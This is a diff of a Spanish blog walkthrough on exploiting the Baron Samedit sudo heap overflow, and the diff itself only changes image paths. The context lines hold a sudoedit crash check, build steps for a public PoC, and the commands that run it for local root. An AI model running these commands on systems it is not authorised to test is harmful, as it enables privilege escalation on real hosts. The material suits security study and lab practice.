@@ -21,7 +21,7 @@ Primero comprobamos si el sistema es vulnerable:
 sudoedit -s '\' $(python3 -c 'print("A"*1000)')
 ```
 
-![Si el sistema es vulnearble obtenemos un error por corrupción de memoria](2025-01-11_14-01.png)
+![Si el sistema es vulnearble obtenemos un error por corrupción de memoria](/assets/img/posts/baron_samedit/20250111_130150_2025-01-11_14-01.png)
 _Si el sistema es vulnearble obtenemos un error por corrupción de memoria_
 
 Este PoC fue descubierto por lockedbyte:
@@ -40,19 +40,19 @@ Con el repositorio clonado debemos compilar el PoC:
 make
 ```
 
-![Compilación del exploit](2025-01-11_14-07.png)
+![Compilación del exploit](/assets/img/posts/baron_samedit/20250111_130714_2025-01-11_14-07.png)
 
 ```bash
 ls -la
 ```
 
-![Listado de archivos](2025-01-11_14-09.png)
+![Listado de archivos](/assets/img/posts/baron_samedit/20250111_130918_2025-01-11_14-09.png)
 
 ```bash
 ./sudo-hax-me-a-sandwich
 ```
 
-![Ejecución del exploit](2025-01-11_14-10.png)
+![Ejecución del exploit](/assets/img/posts/baron_samedit/20250111_131028_2025-01-11_14-10.png)
 
 Como tenemos que seleccionar la versión del sistema podemos verificar cual es de la siguiente forma:
 
@@ -60,7 +60,7 @@ Como tenemos que seleccionar la versión del sistema podemos verificar cual es d
 cat /etc/issue
 ```
 
-![Verificación de versión](2025-01-11_14-15.png)
+![Verificación de versión](/assets/img/posts/baron_samedit/20250111_131601_2025-01-11_14-15.png)
 
 Ahora que sabemos la verión concreta ejecutamos el exploit:
 
@@ -68,7 +68,7 @@ Ahora que sabemos la verión concreta ejecutamos el exploit:
 ./sudo-hax-me-a-sandwich 0
 ```
 
-![Ejecución final del exploit](2025-01-11_14-17.png)
+![Ejecución final del exploit](/assets/img/posts/baron_samedit/20250111_131727_2025-01-11_14-17.png)
 
 ## Explicación
 
